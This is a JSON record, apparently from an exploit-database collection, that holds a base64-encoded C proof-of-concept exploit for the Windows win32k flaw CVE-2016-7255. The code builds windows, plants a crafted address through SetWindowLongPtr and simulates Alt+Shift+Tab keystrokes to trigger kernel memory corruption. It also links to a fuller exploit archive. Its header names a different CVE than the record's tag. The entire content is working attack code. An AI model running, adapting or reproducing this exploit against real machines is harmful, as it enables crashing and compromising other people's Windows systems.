{
    "source": "exploit-database", 
    "exploit": "LyoNClNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL3RpbnlzZWMvcHVibGljL3RyZWUvbWFzdGVyL0NWRS0yMDE2LTcyNTUNCg0KRnVsbCBQcm9vZiBvZiBDb25jZXB0Og0KDQpodHRwczovL2dpdGh1Yi5jb20vdGlueXNlYy9wdWJsaWMvdHJlZS9tYXN0ZXIvQ1ZFLTIwMTYtNzI1NQ0KaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvc3Bsb2l0cy80MDc0NS56aXANCg0KKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiBDcmVhdGVkOgkyMDE2LTExLTA5IDE0OjIzOjA5DQogRmlsZW5hbWU6IAltYWluLmMNCiBBdXRob3I6CXJvb3RbYXRdVGlueVNlYy5uZXQNCiBWZXJzaW9uCTAuMC4wLjENCiBQdXJwb3NlOglwb2Mgb2YgY3ZlLTIwMTYtMDA3NQ0KKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoqLw0KDQojaW5jbHVkZSA8d2luZG93cy5oPg0KI2luY2x1ZGUgPHdjaGFyLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCg0KDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KI3ByYWdtYSBjb21tZW50KGxpYiwibnRkbGwubGliIikNCiNwcmFnbWEgY29tbWVudChsaWIsInVzZXIzMi5saWIiKQ0KDQojdW5kZWYgRGJnUHJpbnQNClVMT05HIF9fY2RlY2wgRGJnUHJpbnRFeCggSU4gVUxPTkcgQ29tcG9uZW50SWQsIElOIFVMT05HIExldmVsLCBJTiBQQ0NIIEZvcm1hdCwgSU4gLi4uICk7DQpVTE9ORyBfX2NkZWNsIERiZ1ByaW50KF9faW4gY2hhciogRm9ybWF0LCAuLi4pDQp7DQoJQ0hBUiogcHN6RGJnQnVmZiA9IE5VTEw7DQoJdmFfbGlzdCBWYUxpc3Q9TlVMTDsNCglVTE9ORyB1bFJldCA9IDA7DQoJDQoJZG8gDQoJew0KCQlwc3pEYmdCdWZmID0gKENIQVIqKUhlYXBBbGxvYyhHZXRQcm9jZXNzSGVhcCgpLCAwICwxMDI0ICogc2l6ZW9mKENIQVIpKTsNCgkJaWYgKE5VTEwgPT0gcHN6RGJnQnVmZikNCgkJew0KCQkJYnJlYWs7DQoJCX0NCgkJUnRsWmVyb01lbW9yeShwc3pEYmdCdWZmLDEwMjQgKiBzaXplb2YoQ0hBUikpOw0KCQkNCgkJdmFfc3RhcnQoVmFMaXN0LEZvcm1hdCk7DQoJCQ0KCQlfdnNucHJpbnRmKChDSEFSKilwc3pEYmdCdWZmLDEwMjQgLSAxLEZvcm1hdCxWYUxpc3QpOw0KCQkNCgkJRGJnUHJpbnRFeCg3NyAsIDAgLCBwc3pEYmdCdWZmICk7DQoJCU91dHB1dERlYnVnU3RyaW5nQShwc3pEYmdCdWZmKTsNCgkJDQoJCXZhX2VuZChWYUxpc3QpOw0KCQkNCgl9IHdoaWxlIChGQUxTRSk7DQoJDQoJaWYgKE5VTEwgIT0gcHN6RGJnQnVmZikNCgl7DQoJCUhlYXBGcmVlKCBHZXRQcm9jZXNzSGVhcCgpLCAwICwgcHN6RGJnQnVmZiApOw0KCQlwc3pEYmdCdWZmID0gTlVMTDsNCgl9DQoJDQoJcmV0dXJuIHVsUmV0Ow0KfQ0KDQoNCiBpbnQgX3NpbV9rZXlfZG93bihXT1JEIHdLZXkpDQogew0KCSBJTlBVVCBzdElucHV0ID0gezB9Ow0KCSANCgkgZG8gDQoJIHsNCgkJIHN0SW5wdXQudHlwZSA9IElOUFVUX0tFWUJPQVJEOw0KCQkgc3RJbnB1dC5raS53VmsgPSB3S2V5Ow0KCQkgc3RJbnB1dC5raS5kd0ZsYWdzID0gMDsNCgkJIA0KCQkgU2VuZElucHV0KDEgLCAmc3RJbnB1dCAsIHNpemVvZihzdElucHV0KSApOw0KDQoJIH0gd2hpbGUgKEZBTFNFKTsNCgkgDQoJIHJldHVybiAwOw0KfQ0KDQogaW50IF9zaW1fa2V5X3VwKFdPUkQgd0tleSkNCiB7DQoJIElOUFVUIHN0SW5wdXQgPSB7MH07DQoJIA0KCSBkbyANCgkgew0KCQkgc3RJbnB1dC50eXBlID0gSU5QVVRfS0VZQk9BUkQ7DQoJCSBzdElucHV0LmtpLndWayA9IHdLZXk7DQoJCSBzdElucHV0LmtpLmR3RmxhZ3MgPSBLRVlFVkVOVEZfS0VZVVA7DQoJCSANCgkJIFNlbmRJbnB1dCgxICwgJnN0SW5wdXQgLCBzaXplb2Yoc3RJbnB1dCkgKTsNCgkJIA0KCSB9IHdoaWxlIChGQUxTRSk7DQoJIA0KCSByZXR1cm4gMDsNCn0NCg0KIGludCBfc2ltX2FsdF9zaGlmdF9lc2MoKQ0KIHsNCgkgaW50IGkgPSAwOw0KCSANCgkgZG8gDQoJIHsNCgkJIF9zaW1fa2V5X2Rvd24oIFZLX01FTlUgKTsNCgkJIF9zaW1fa2V5X2Rvd24oIFZLX1NISUZUICk7CSANCgkJIA0KCQkNCgkJX3NpbV9rZXlfZG93biggVktfRVNDQVBFKTsNCgkJX3NpbV9rZXlfdXAoIFZLX0VTQ0FQRSk7DQoNCgkJX3NpbV9rZXlfZG93biggVktfRVNDQVBFKTsNCgkJX3NpbV9rZXlfdXAoIFZLX0VTQ0FQRSk7DQoJCQkgDQoJCSBfc2ltX2tleV91cCggVktfTUVOVSApOw0KCQkgX3NpbV9rZXlfdXAoIFZLX1NISUZUICk7CSAJIA0KCQkgDQoJCSANCgkgfSB3aGlsZSAoRkFMU0UpOw0KCSANCgkgcmV0dXJuIDA7DQp9DQoNCiANCg0KIGludCBfc2ltX2FsdF9zaGlmdF90YWIoaW50IG5Db3VudCkNCiB7DQoJIGludCBpID0gMDsNCgkgSFdORCBoV25kID0gTlVMTDsNCg0KDQoJIGludCBuRmluYWxSZXQgPSAtMTsNCg0KCSBkbyANCgkgew0KCQkgX3NpbV9rZXlfZG93biggVktfTUVOVSApOw0KCQkgX3NpbV9rZXlfZG93biggVktfU0hJRlQgKTsJIA0KDQoNCgkJIGZvciAoIGkgPSAwOyBpIDwgbkNvdW50IDsgaSsrKQ0KCQkgew0KCQkJIF9zaW1fa2V5X2Rvd24oIFZLX1RBQik7DQoJCQkgX3NpbV9rZXlfdXAoIFZLX1RBQik7DQoJCQkgDQoJCQkgU2xlZXAoMTAwMCk7DQoNCgkJIH0NCgkNCgkJIA0KCQlfc2ltX2tleV91cCggVktfTUVOVSApOw0KCQkgX3NpbV9rZXlfdXAoIFZLX1NISUZUICk7CSANCgkgfSB3aGlsZSAoRkFMU0UpOw0KCSANCgkgcmV0dXJuIG5GaW5hbFJldDsNCn0NCg0KDQoNCmludCBvcl9hZGRyZXNzX3ZhbHVlXzQoX19pbiB2b2lkKiBwQWRkcmVzcykNCnsNCglXTkRDTEFTU0VYVyBzdFdDID0gezB9Ow0KDQoJSFdORAloV25kUGFyZW50ID0gTlVMTDsNCglIV05ECWhXbmRDaGlsZCA9IE5VTEw7DQoNCglXQ0hBUioJcHN6Q2xhc3NOYW1lID0gTCJjdmUtMjAxNi03MjU1IjsNCglXQ0hBUioJcHN6VGl0bGVOYW1lID0gTCJjdmUtMjAxNi03MjU1IjsNCg0KCXZvaWQqCXBJZCA9IE5VTEw7DQoJTVNHCQlzdE1zZyA9IHswfTsNCg0KCWRvIA0KCXsNCg0KCQlzdFdDLmNiU2l6ZSA9IHNpemVvZihzdFdDKTsNCgkJc3RXQy5scGZuV25kUHJvYyA9IERlZldpbmRvd1Byb2NXOw0KCQlzdFdDLmxwc3pDbGFzc05hbWUgPSBwc3pDbGFzc05hbWU7DQoJCQ0KCQlpZiAoIDAgPT0gUmVnaXN0ZXJDbGFzc0V4Vygmc3RXQykgKQ0KCQl7DQoJCQlicmVhazsNCgkJfQ0KDQoJCWhXbmRQYXJlbnQgPSBDcmVhdGVXaW5kb3dFeFcoDQoJCQkwLA0KCQkJcHN6Q2xhc3NOYW1lLA0KCQkJTlVMTCwNCgkJCVdTX09WRVJMQVBQRURXSU5ET1d8V1NfVklTSUJMRSwNCgkJCTAsDQoJCQkwLA0KCQkJMzYwLA0KCQkJMzYwLA0KCQkJTlVMTCwNCgkJCU5VTEwsDQoJCQlHZXRNb2R1bGVIYW5kbGVXKE5VTEwpLA0KCQkJTlVMTA0KCQkpOw0KDQoJCWlmIChOVUxMID09IGhXbmRQYXJlbnQpDQoJCXsNCgkJCWJyZWFrOw0KCQl9DQoNCgkJaFduZENoaWxkID0gQ3JlYXRlV2luZG93RXhXKA0KCQkJMCwNCgkJCXBzekNsYXNzTmFtZSwNCgkJCXBzelRpdGxlTmFtZSwNCgkJCVdTX09WRVJMQVBQRURXSU5ET1d8V1NfVklTSUJMRXxXU19DSElMRCwNCgkJCTAsDQoJCQkwLA0KCQkJMTYwLA0KCQkJMTYwLA0KCQkJaFduZFBhcmVudCwNCgkJCU5VTEwsDQoJCQlHZXRNb2R1bGVIYW5kbGVXKE5VTEwpLA0KCQkJTlVMTA0KCQkpOw0KCQkNCgkJaWYgKE5VTEwgPT0gaFduZENoaWxkKQ0KCQl7DQoJCQlicmVhazsNCgkJfQ0KDQoJCSNpZmRlZiBfV0lONjQNCgkJCXBJZCA9ICggKFVDSEFSKilwQWRkcmVzcyAtIDB4MjggKTsgDQoJCSNlbHNlDQoJCQlwSWQgPSAoIChVQ0hBUiopcEFkZHJlc3MgLSAweDE0KTsgDQoJCSNlbmRpZiAvLyAjaWZkZWYgX1dJTjY0DQoJCQ0KCQlTZXRXaW5kb3dMb25nUHRyKGhXbmRDaGlsZCAsIEdXTFBfSUQgLCAoTE9OR19QVFIpcElkICk7DQoNCgkJRGJnUHJpbnQoImhXbmRDaGlsZCA9IDB4JXBcbiIgLCBoV25kQ2hpbGQpOw0KCQlEZWJ1Z0JyZWFrKCk7DQoNCgkJU2hvd1dpbmRvdyhoV25kUGFyZW50ICwgU1dfU0hPV05PUk1BTCk7DQoNCgkJU2V0UGFyZW50KGhXbmRDaGlsZCAsIEdldERlc2t0b3BXaW5kb3coKSApOw0KDQoJCVNldEZvcmVncm91bmRXaW5kb3coaFduZENoaWxkKTsNCg0KCQlfc2ltX2FsdF9zaGlmdF90YWIoNCk7DQoJCQ0KCQlTd2l0Y2hUb1RoaXNXaW5kb3coaFduZENoaWxkICwgVFJVRSk7DQoJCQ0KCQlfc2ltX2FsdF9zaGlmdF9lc2MoKTsNCg0KDQoJCXdoaWxlKCBHZXRNZXNzYWdlKCZzdE1zZyAsIE5VTEwgLCAwICwgMCkgKQ0KCQl7CQ0KCQkJVHJhbnNsYXRlTWVzc2FnZSgmc3RNc2cpOw0KCQkJRGlzcGF0Y2hNZXNzYWdlKCZzdE1zZyk7DQoJCX0NCgkNCg0KCX0gd2hpbGUgKEZBTFNFKTsNCg0KCWlmICggTlVMTCAhPSBoV25kUGFyZW50ICkNCgl7DQoJCURlc3Ryb3lXaW5kb3coaFduZFBhcmVudCk7DQoJCWhXbmRQYXJlbnQgPSBOVUxMOw0KCX0NCg0KCWlmICggTlVMTCAhPSBoV25kQ2hpbGQgKQ0KCXsNCgkJRGVzdHJveVdpbmRvdyhoV25kQ2hpbGQpOw0KCQloV25kQ2hpbGQgPSBOVUxMOw0KCX0NCg0KCVVucmVnaXN0ZXJDbGFzc1cocHN6Q2xhc3NOYW1lICwgR2V0TW9kdWxlSGFuZGxlVyhOVUxMKSApOw0KDQoJcmV0dXJuIDA7DQp9DQoNCmludCBfX2NkZWNsIHdtYWluKGludCBuQXJnYywgV0NIQVIqKiBBcmd2KQ0Kew0KCWRvIA0KCXsNCgkJb3JfYWRkcmVzc192YWx1ZV80KCAodm9pZCopMHhGRkZGRkZGRiApOw0KCX0gd2hpbGUgKEZBTFNFKTsNCgkNCglyZXR1cm4gMDsNCn0=", 
    "filename": "platforms/windows/dos/40745.c", 
    "id": "40745", 
    "cves": [
        "CVE-2016-7255"
    ]
}